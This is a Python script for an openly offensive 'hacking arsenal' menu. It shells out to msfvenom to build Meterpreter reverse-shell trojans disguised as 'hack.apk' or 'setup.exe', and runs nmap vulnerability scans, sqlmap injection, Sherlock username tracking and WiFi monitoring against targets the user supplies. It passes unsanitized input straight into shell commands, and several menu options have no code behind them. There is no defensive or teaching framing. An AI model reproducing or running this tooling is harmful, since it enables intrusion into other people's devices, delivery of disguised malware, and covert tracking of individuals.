import os
import time
import subprocess
from termcolor import colored

def clear():
    os.system('clear')

def banner():
    print(colored("          .  .  .  .", "yellow"))
    print(colored("         |         |", "yellow"))
    print(colored("      _  👑 Body 👑  _", "red"))
    print(colored("     ( . . . . . . . . )", "yellow"))
    print(colored("      '---------------'", "yellow"))
    logo = """
    ██████╗ ███████╗
    ██╔══██╗╚════██║
    ██████╔╝    ██╔╝
    ██╔══██╗   ██╔╝ 
    ██████╔╝   ██║  
    ╚═════╝    ╚═╝  
    """
    print(colored(logo, "cyan"))
    print(colored("    --- [ B7 ULTIMATE ARSENAL - V6.0 ] ---", "green"))
    print(colored("    --- [ FULL EXPLOITATION & OSINT ] ---", "white"))
    print("\n")

def menu():
    print(colored("--- [ 1. METASPLOIT & PAYLOADS ] ---", "magenta"))
    print("[1] Launch Metasploit Framework  [2] Create Android APK Hack")
    print("[3] Create Windows (.exe) Hack   [4] Create Python Reverse Shell")
    
    print(colored("\n--- [ 2. NMAP & NETWORK SCAN ] ---", "blue"))
    print("[5] Quick Port Scan              [6] Detect OS & Services")
    print("[7] Full Vulnerability Scan      [8] Scan Network Range")
    
    print(colored("\n--- [ 3. OSINT & INFO GATHERING ] ---", "green"))
    print("[9] Track User (Sherlock)        [10] Domain Info (Whois)")
    print("[11] Gather Emails (Harvester)   [12] IP Geolocation Trace")
    
    print(colored("\n--- [ 4. WEB ATTACKS & WIFI ] ---", "red"))
    print("[13] SQL Injection (SQLMap)      [14] Admin Panel Finder")
    print("[15] Directory Buster (Dirb)     [16] WiFi Scan (Airodump)")
    
    print(colored("\n--- [ 5. PRIVACY & FUN ] ---", "yellow"))
    print("[17] Enable Tor Stealth Mode     [18] SSH Brute Force (Hydra)")
    print("[19] ❤️ My Heart / 💀 Ghost     [0] Exit")

def main():
    while True:
        clear()
        banner()
        menu()
        choice = input(colored("\nB7-Ultimate > ", "cyan"))

        # --- Metasploit ---
        if choice == '1':
            print(colored("[!] Starting Metasploit Console...", "magenta"))
            os.system("msfconsole")
        elif choice == '2':
            ip = input("LHOST (Your IP): "); port = input("LPORT: ")
            name = input("Output Name (eg. hack.apk): ")
            os.system(f"msfvenom -p android/meterpreter/reverse_tcp LHOST={ip} LPORT={port} -o {name}")
        elif choice == '3':
            ip = input("LHOST: "); port = input("LPORT: ")
            name = input("Output Name (eg. setup.exe): ")
            os.system(f"msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST={ip} LPORT={port} -f exe -o {name}")

        # --- Nmap ---
        elif choice == '5':
            ip = input("Target IP: ")
            os.system(f"nmap {ip}")
            input("\nEnter to continue...")
        elif choice == '7':
            ip = input("Target IP: ")
            print(colored("[!] Scanning for Vulnerabilities...", "yellow"))
            os.system(f"nmap --script vuln {ip}")
            input("\nEnter to continue...")

        # --- OSINT ---
        elif choice == '9':
            user = input("Username: ")
            os.system(f"sherlock {user}")
            input("\nEnter to continue...")
        elif choice == '12':
            ip = input("IP Address: ")
            os.system(f"curl http://ip-api.com/line/{ip}")
            input("\nEnter to continue...")

        # --- Web & WiFi ---
        elif choice == '13':
            url = input("Target URL: ")
            os.system(f"sqlmap -u {url} --batch --random-agent")
        elif choice == '16':
            print(colored("[!] Monitoring WiFi (Ctrl+C to stop)...", "blue"))
            os.system("sudo airodump-ng wlan0")

        # --- Privacy ---
        elif choice == '17':
            print(colored("[!] Tor Service Starting...", "cyan"))
            os.system("sudo service tor restart")
            print(colored("[+] Success! Route your tools via proxychains.", "green"))
            time.sleep(2)
        elif choice == '19':
            os.system("cmatrix -C red")
        
        elif choice == '0':
            print(colored("Goodbye Body! Happy Hacking.", "red"))
            break

if __name__ == "__main__":
    main()
